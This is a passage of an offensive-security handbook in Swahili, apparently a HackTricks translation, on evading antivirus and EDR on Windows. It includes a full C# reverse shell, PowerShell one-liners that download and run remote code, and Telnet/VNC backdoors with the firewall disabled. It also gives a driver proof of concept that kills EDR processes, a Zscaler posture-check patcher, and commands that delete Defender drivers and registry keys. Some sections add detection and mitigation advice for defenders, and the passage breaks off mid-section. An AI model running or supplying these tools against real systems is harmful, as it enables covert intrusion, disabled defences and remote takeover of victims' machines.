4. Tekeleza command iliyotolewa baada ya kufanya marekebisho yanayohitajika: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parameter ya `--pin` huweka PIN bila kutumia GUI).
 

## Kukwepa Utambuzi kwa Mbinu za Juu

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Kukwepa utambuzi ni mada changamano sana; wakati mwingine unapaswa kuzingatia vyanzo vingi tofauti vya telemetry katika mfumo mmoja tu, kwa hiyo haiwezekani kabisa kubaki bila kutambuliwa katika mazingira yaliyokomaa.

Kila mazingira unayolenga yatakuwa na nguvu na udhaifu wake.

Ninakuhimiza sana uangalie mazungumzo haya kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili upate msingi wa mbinu za Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hili pia ni mazungumzo mengine mazuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Mbinu za Zamani**

### **Angalia ni sehemu zipi Defender huziona kuwa hasidi**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), ambayo **huondoa sehemu za binary** hatua kwa hatua hadi **igundue ni sehemu gani Defender** inaona kuwa hasidi, kisha ikutenganishie sehemu hiyo.\
Tool nyingine inayofanya **jambo lilelile ni** [**avred**](https://github.com/dobin/avred), inayotoa huduma hiyo kupitia tovuti katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo ungeweza kuisakinisha (kama administrator) kwa kufanya:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Iweke **ianze** mfumo unapowashwa na **uiendeshe** sasa:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Badilisha port ya telnet** (kwa kujificha) na uzime firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unahitaji vipakuliwa vya bin, si vya setup)

**KWENYE HOST**: Tekeleza _**winvnc.exe**_ na usanidi server:

- Washa chaguo _Disable TrayIcon_
- Weka nenosiri katika _VNC Password_
- Weka nenosiri katika _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na faili _**UltraVNC.ini**_ **lililoundwa hivi punde** ndani ya **victim**

#### **Reverse connection**

**Attacker** anapaswa **kutekeleza ndani ya** host yake binary `vncviewer.exe -listen 5900` ili iwe **tayari** kupokea **VNC connection** ya reverse. Kisha, ndani ya **victim**: Anzisha daemon ya winvnc `winvnc.exe -run` na uendeshe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ONYO:** Ili kudumisha usiri, usifanye mambo machache

- Usianzishe `winvnc` ikiwa tayari inaendeshwa, vinginevyo utasababisha [popup](https://i.imgur.com/1SROTTl.png). Angalia ikiwa inaendeshwa kwa `tasklist | findstr winvnc`
- Usianzishe `winvnc` bila `UltraVNC.ini` kwenye saraka hiyo hiyo, vinginevyo [dirisha la usanidi](https://i.imgur.com/rfMQWcf.png) litafunguka
- Usiendeshe `winvnc -h` ili kupata msaada, vinginevyo utasababisha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Ndani ya GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sasa **anzisha lister** kwa kutumia `msfconsole -r file.rc` na **tekeleza** **xml payload** kwa kutumia:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Defender wa sasa atasitisha mchakato haraka sana.**

### Kukompile reverse shell yetu wenyewe

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Reverse shell ya kwanza ya C#

Ikopile kwa kutumia:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Itumie pamoja na:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# kwa kutumia compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Upakuaji na utekelezaji wa kiotomatiki:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia Python kwa mfano wa kutengeneza injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kuua AV/EDR Kutoka Nafasi ya Kernel

Storm-2603 ilitumia kifaa kidogo cha console kinachojulikana kama **Antivirus Terminator** kuzima ulinzi wa endpoint kabla ya kuangusha ransomware. Kifaa hiki huja na **driver yake yenyewe iliyo hatarini lakini *iliyotiwa saini*** na huitumia vibaya kutekeleza operesheni za kernel zenye ruhusa za juu ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzuia.<sup>[[12]](#references)</sup>

Mambo muhimu ya kukumbuka
1. **Driver iliyotiwa saini**: Faili inayowasilishwa kwenye diski ni `ServiceMouse.sys`, lakini binary hiyo ni driver iliyotiwa saini kihalali, `AToolsKrnl64.sys`, kutoka kwenye “System In-Depth Analysis Toolkit” ya Antiy Labs. Kwa kuwa driver hiyo ina saini halali ya Microsoft, hupakiwa hata wakati Driver-Signature-Enforcement (DSE) imewashwa.
2. **Usakinishaji wa service**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Mstari wa kwanza husajili driver kama **kernel service** na wa pili huiwasha ili `\\.\ServiceMouse` ipatikane kutoka user land.
3. **IOCTLs zinazotolewa na driver**
   | Msimbo wa IOCTL | Uwezo                                      |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Kusitisha process yoyote kwa PID (hutumika kuua huduma za Defender/EDR) |
   | `0x990000D0` | Kufuta faili yoyote kwenye diski |
   | `0x990001D0` | Kuondoa driver na kufuta service |

   Mfano mdogo wa uthibitisho wa dhana wa C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Kwa nini inafanya kazi**: BYOVD hupita kabisa ulinzi wa user-mode; msimbo unaotekelezwa kwenye kernel unaweza kufungua michakato *iliyolindwa*, kuisimamisha, au kuchezea kernel objects bila kujali PPL/PP, ELAM au vipengele vingine vya kuimarisha usalama.

Ugunduzi / Upunguzaji wa Hatari
• Washa orodha ya Microsoft ya kuzuia drivers zilizo hatarishi (`HVCI`, `Smart App Control`) ili Windows ikatae kupakia `AToolsKrnl64.sys`.
• Fuatilia uundaji wa huduma mpya za *kernel* na toa tahadhari driver inapopakiwa kutoka kwenye saraka inayoweza kuandikiwa na watumiaji wote au haipo kwenye orodha ya kuruhusiwa.
• Chunguza handles za user-mode kwa custom device objects zikifuatiwa na miito ya kutiliwa shaka ya `DeviceIoControl`.

### Kukwepa Ukaguzi wa Hali ya Kifaa wa Zscaler Client Connector kwa Kurekebisha Binary Zilizo Kwenye Diski

**Client Connector** ya Zscaler hutekeleza sheria za hali ya kifaa ndani ya kifaa na hutegemea Windows RPC kuwasilisha matokeo kwa vipengele vingine. Chaguo mbili dhaifu za usanifu hufanya iwezekane kukwepa ukaguzi kikamilifu:

1. Tathmini ya hali ya kifaa hufanyika **upande wa mteja pekee** (thamani ya boolean hutumwa kwa seva).
2. RPC endpoints za ndani hukagua tu kwamba executable inayounganisha **imesainiwa na Zscaler** (kupitia `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Kwa **kurekebisha binaries nne zilizosainiwa kwenye diski**, mbinu zote mbili zinaweza kuzimwa:

| Binary | Mantiki ya awali iliyorekebishwa | Matokeo |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Hurejesha `1` kila mara ili kila ukaguzi uonekane umetii masharti |
| `ZSAService.exe` | Mwito usio wa moja kwa moja wa `WinVerifyTrust` | Hubadilishwa kuwa NOP ⇒ mchakato wowote (hata ambao haujasainiwa) unaweza kuunganisha kwenye mabomba ya RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Hubadilishwa na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Ukaguzi wa uadilifu wa tunnel | Hupitishwa moja kwa moja |

Dondoo fupi la patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Baada ya kubadilisha faili asili na kuwasha upya stack ya huduma:

* Ukaguzi **wote** wa posture huonyesha hali ya **green/compliant**.
* Binaries zisizosainiwa au zilizorekebishwa zinaweza kufungua endpoints za named-pipe RPC (kwa mfano, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host iliyodhibitiwa hupata ufikiaji usio na vizuizi kwa mtandao wa ndani unaofafanuliwa na sera za Zscaler.

Uchunguzi huu wa kisa unaonyesha jinsi maamuzi ya uaminifu yanayofanyika upande wa mteja pekee na ukaguzi rahisi wa saini vinavyoweza kushindwa kwa marekebisho machache ya byte.

## Matumizi mabaya ya utendakazi unaoaminika wa Microsoft Defender `BTR.sys`

Driver ya **Boot-Time Removal** ya Defender ni mfano wa kupinga BYOVD ya kawaida. `BTR.sys` ni sehemu halali ya urekebishaji iliyosainiwa na Microsoft, isiyo na hitilafu ya uharibifu wa kumbukumbu wala kiolesura cha IOCTL; baada ya kupata ufikiaji wa msimamizi na `SeLoadDriverPrivilege`, operator anaweza badala yake kughushi muamala wake binafsi wa urekebishaji na kupata operesheni za faili/registry za Ring-0 zilizokusudiwa. Hii ni **primitive ya kubatilisha AV/EDR baada ya mfumo kuathiriwa, si ufikiaji wa awali wala kupandisha kiwango cha ruhusa**, na driver inaweza kutolewa kutoka kwenye resource ya `BOOTTIMETOOL` ndani ya `MpEngine.dll` ya lengo lenyewe badala ya kuleta driver ya mtu wa tatu inayotia shaka.<sup>[[36]](#references)</sup>

### Kuweka driver ya matumizi ya mara moja

Kwa kawaida Defender hutupa resource hiyo kama faili la `[a-z]{8}.sys` lenye jina la nasibu na kusajili huduma ya kernel yenye jina linalofanana. `DriverEntry` husoma thamani ya `Args` ya huduma, hufungua NTFS ADS iliyorejelewa, husimbua na kuthibitisha orodha ya vitendo, huandika mrejesho, na kurudisha `0xC0000056` (`STATUS_DELETE_PENDING`) baada ya utekelezaji kufanikiwa ili driver ijiondoe badala ya kubaki kwenye kumbukumbu. Huduma iliyoghushiwa huwa na thamani bainifu zifuatazo.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Mtiririko wa `:changelist` una blob moja iliyosimbwa kwa RC4. Builds zilizochanganuliwa hutumia tena key isiyobadilika ya baiti 256, kwa hiyo usimbaji si kizuizi cha uidhinishaji. Plaintext halali ina header ya jumla ya baiti 24 (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC ya header na transaction ID inayotokana na payload), ikifuatiwa na njia ya feedback ya UTF-16 inayokomea kwa null na idadi yoyote ya items. Kila item ina header ya baiti 16 (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) pamoja na data mahususi kwa action inayoishia kwa **baiti NUL nne hasa**. Kila eneo la header/data hukaguliwa kivyake kwa CRC-32 yenye polynomial `0xEDB88320`, hali ya awali `0xFFFFFFFF`, na **bila XOR ya mwisho** (`~CRC32`); hali ya CRC huwekwa upya kwa kila eneo.<sup>[[36]](#references)[[37]](#references)</sup>

Action IDs zinazokubaliwa hufichua primitives hizi za kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Data ya item | Matokeo |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Futa faili, hata ikiwa imefungwa |
| 2 | `[UTF-16 path]` | Ondoa saraka tupu |
| 3 | `[Flags][source][destination]` | Hamisha faili hadi kwenye path iliyolindwa iliyochaguliwa na mshambuliaji; destination tupu humaanisha kufuta |
| 4 | `[Flags][key path]` | Futa kwa kujirudia ufunguo wa registry |
| 5 | `[Flags][key path + "\\" + value]` | Futa value ya registry |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Unda/sasisha value ya registry na uunde njia za key ambazo hazipo |

Kwa actions 5 na 6, kitenganishi cha key/value kwenye waya ni **backslash mbili zinazofuatana**; path iliyopangwa kwa kawaida haitagawanywa ipasavyo. Faili ya feedback kwa kiasi kikubwa huakisi ombi, lakini baiti nne za kwanza za data ya kila item huwa `NTSTATUS` yake ya matokeo. Kwa actions 1 na 2, ambazo hazina sehemu ya flags mwanzoni, BTR huhamisha path hadi kwenye baiti nne za mwisho zilizotengwa ili kutoa nafasi ya status hiyo.<sup>[[36]](#references)</sup>

### Mtiririko wa kazi wa `BTR_CLI` na kipindi cha awali cha kuwasha

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) hutekeleza mnyororo mzima: kutoa `BTR.sys` kutoka Defender ya ndani, kuunda `<random>.sys:changelist` na stream ya feedback, kusimba actions zilizounganishwa pamoja na checksums na kuzisimba kwa njia fiche, kuunda moja kwa moja service registry key, kisha kuita `NtLoadDriver` kwa `-trigger now` au kuiacha iwe driver ya system-start kwa `-trigger boot`. Kuweka taarifa moja kwa moja kwenye registry huepuka njia ya kawaida ya SCM `CreateServiceW` na kwa hiyo **hakuzalishi** Service Install Event ID 7045. Artifacts zilizoanzishwa wakati wa boot zinaweza kuondolewa baadaye kwa `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` haiwezi kutumika kwa sababu BTR hufanya I/O ya faili kutoka `DriverEntry` kabla stack ya hifadhi na kiungo cha `SystemRoot` kuwa tayari. `Start=1` pamoja na kundi lenye kipaumbele cha juu la `Boot Bus Extender` badala yake hutekelezwa katika Phase 1: NTFS inaweza kutumika, lakini viendeshi vingi vya usalama vinavyoanza na mfumo na huduma za EDR za user-mode bado hazijaanzishwa. Vichujio vinavyoanza wakati wa kuwasha, kama `WdFilter`, huenda tayari vimepakiwa, lakini BTR inaweza kuondoa faili zake za binary au usanidi wa huduma kabla ya kuwasha kunakofuata, na inaweza kufuta programu zinazotekelezeka za huduma kabla ya SCM kuzianzisha. ELAM haizibi pengo hili kwa sababu BTR huendeshwa baada ya tathmini ya viendeshi vinavyoanza wakati wa kuwasha, na ina saini halali ya Microsoft.<sup>[[36]](#references)</sup>

Vitendo vingi hutekelezwa katika muamala mmoja. PoC huongeza Action 1 mwanzoni kwa `\SystemRoot\Temp\BootClean.log` iliyowekwa moja kwa moja kwenye msimbo: BTR huunda logi hii, kisha hutekeleza ombi lake la kuifuta na kuiondoa kabla ya kujiondoa. Hii hupunguza ushahidi, huku kuweka maoni ya mrejesho katika `<random>.sys:<random>.dat` kukiruhusu kuondoa kiendeshi na mitiririko yote miwili pamoja.<sup>[[36]](#references)[[37]](#references)</sup>

### Uwiano wa vihisishi vya juu kwa utambuzi

Kanuni zinazotegemea saini pekee na orodha ya Microsoft ya viendeshi hatari vilivyozuiwa hazishughulikii matumizi mabaya ya utendakazi uliokusudiwa wa BTR. Pendelea uwiano huu wa kitabia, huku ukitofautisha asili halali ya Defender na programu yoyote ya kiholela ya kuanzisha.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Kuundwa kwa `.sys:changelist` ni jambo la kawaida katika hatua zote za uwekaji wa BTR. ADS ya `.dat` iliyoambatishwa kwenye `.sys` hiyo hiyo inatia shaka zaidi, kwa sababu Defender halali kwa kawaida huweka maoni ya mrejesho chini ya `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bila System 7045:** Linganisha uundaji wa moja kwa moja wa `HKLM\SYSTEM\CurrentControlSet\Services\<random>` wenye `Args=...:changelist` na `Group=Boot Bus Extender` na kutokuwepo kwa tukio linalolingana la usakinishaji wa SCM.
- **Sysmon 6 -> 23:** Linganisha upakiaji wa kiendeshi cha BTR kinachojulikana kutoka asili isiyo ya Defender na ufutaji wa faili unaofuata unaohusishwa na `System`/PID 4, hasa kwa faili za binary za usalama.
- **Sysmon 11 -> 23:** Toa tahadhari kuhusu uundaji na ufutaji wa haraka wa `\SystemRoot\Temp\BootClean.log` na `System`/PID 4.
- Zuia na kagua ugawaji/uwashaji wa `SeLoadDriverPrivilege`; saini ya Microsoft pekee haitoshi kuthibitisha uaminifu wakati kiendeshi cha zana ya usalama kinawekwa na `cmd.exe`, PowerShell, au mchakato usiojulikana.

## Kutumia Vibaya Protected Process Light (PPL) Kuhujumu AV/EDR Kwa LOLBINs

Protected Process Light (PPL) hutekeleza ngazi ya signer/level ili michakato iliyolindwa yenye kiwango sawa au cha juu pekee iweze kuhujumu mingine. Kwa madhumuni ya mashambulizi, ukiweza kuzindua kihalali binary iliyowezeshwa kwa PPL na kudhibiti hoja zake, unaweza kubadilisha utendakazi usio na madhara (kwa mfano, uwekaji wa kumbukumbu) kuwa njia yenye vikwazo ya kuandika, inayoungwa mkono na PPL, dhidi ya saraka zilizolindwa zinazotumiwa na AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Kinachofanya mchakato uendeshwe kama PPL
- EXE lengwa (na DLL zozote zilizopakiwa) lazima ziwe na saini yenye EKU inayoweza kutumia PPL.
- Mchakato lazima uundwe kwa kutumia CreateProcess pamoja na flag hizi: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Lazima iombwe protection level inayooana na signer wa binary (kwa mfano, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` kwa signers wa anti-malware, `PROTECTION_LEVEL_WINDOWS` kwa signers wa Windows). Viwango visivyo sahihi vitasababisha uundaji kushindwa.

Tazama pia utangulizi mpana zaidi wa PP/PPL na ulinzi wa LSASS hapa:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Zana za kuanzisha
- Zana saidizi ya open-source: CreateProcessAsPPL (huchagua protection level na kupeleka hoja kwa EXE lengwa):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Muundo wa matumizi:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Binary ya mfumo iliyosainiwa `C:\Windows\System32\ClipUp.exe` hujizindua yenyewe na hukubali kigezo cha kuandika faili ya kumbukumbu kwenye njia iliyobainishwa na mwito.
- Inapozinduliwa kama mchakato wa PPL, uandishi wa faili hufanyika kwa ulinzi wa PPL.
- ClipUp haiwezi kuchanganua njia zenye nafasi; tumia njia fupi za 8.3 kuelekeza kwenye maeneo ambayo kwa kawaida yamelindwa.

Vifaa saidizi vya njia fupi za 8.3
- Orodhesha majina mafupi: `dir /x` katika kila saraka ya mzazi.
- Pata njia fupi katika cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Mlolongo wa matumizi mabaya (muhtasari)
1) Zindua LOLBIN inayoweza kutumia PPL (ClipUp) kwa kutumia `CREATE_PROTECTED_PROCESS` kupitia kizindua (kwa mfano, CreateProcessAsPPL).
2) Pitisha kigezo cha njia ya kumbukumbu ya ClipUp ili kulazimisha uundaji wa faili katika saraka ya AV iliyolindwa (kwa mfano, Defender Platform). Tumia majina mafupi ya 8.3 ikihitajika.
3) Ikiwa binary lengwa kwa kawaida hufunguliwa/kufungwa na AV inapofanya kazi (kwa mfano, MsMpEng.exe), panga uandishi wakati wa kuwasha kabla ya AV kuanza kwa kusakinisha huduma ya kujiwasha kiotomatiki inayotekelezwa mapema kwa uhakika. Thibitisha mpangilio wa kuwasha kwa kutumia Process Monitor (boot logging).
4) Kompyuta inapowashwa upya, uandishi unaolindwa na PPL hufanyika kabla ya AV kufunga binary zake, na hivyo kuharibu faili lengwa na kuzuia kuanza kwake.

Mfano wa amri (njia zimefichwa/zimefupishwa kwa usalama):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Vidokezo na masharti
- Huwezi kudhibiti maudhui ambayo ClipUp huandika, isipokuwa mahali yanapoandikwa; primitive hii inafaa kwa kuharibu maudhui badala ya kuyaingiza kwa usahihi.
- Inahitaji local admin/SYSTEM ili kusakinisha/kuanzisha service na dirisha la kufanya reboot.
- Muda ni muhimu sana: lengo halipaswi kuwa limefunguliwa; utekelezaji wakati wa kuwasha huepusha file locks.

Utambuzi
- Uundaji wa mchakato wa `ClipUp.exe` ukiwa na arguments zisizo za kawaida, hasa ukiwa umeanzishwa na launchers zisizo za kawaida, karibu na wakati wa kuwasha.
- Services mpya zilizowekwa kuwasha binaries zinazotia shaka kiotomatiki na zinazoanza kabla ya Defender/AV kwa uthabiti. Chunguza uundaji/urekebishaji wa service kabla ya hitilafu za kuanza kwa Defender.
- Ufuatiliaji wa uadilifu wa faili za Defender/directory za Platform; uundaji/urekebishaji usiotarajiwa wa faili unaofanywa na michakato yenye flags za protected-process.
- Telemetry ya ETW/EDR: tafuta michakato iliyoundwa kwa kutumia `CREATE_PROTECTED_PROCESS` na matumizi yasiyo ya kawaida ya kiwango cha PPL na binaries zisizo za AV.

Hatua za kupunguza hatari
- WDAC/Code Integrity: zuia ni binaries zipi zilizotiwa saini zinaweza kuendeshwa kama PPL na chini ya wazazi gani; zuia matumizi ya ClipUp nje ya miktadha halali.
- Usimamizi wa service: zuia uundaji/urekebishaji wa services zinazojiwasha kiotomatiki na fuatilia udanganyifu wa mpangilio wa kuwasha.
- Hakikisha ulinzi dhidi ya tampering wa Defender na ulinzi wa early-launch umewashwa; chunguza hitilafu za kuwasha zinazoashiria uharibifu wa binary.
- Fikiria kuzima uundaji wa majina mafupi ya 8.3 kwenye volumes zinazohifadhi zana za usalama ikiwa mazingira yako yanaendana na hilo (jaribu kwa kina).

## Kuhujumu Microsoft Defender kupitia Utekaji wa Symlink wa Folda ya Toleo la Platform

Windows Defender huchagua platform itakayotumia kwa kuorodhesha folda ndogo zilizo chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

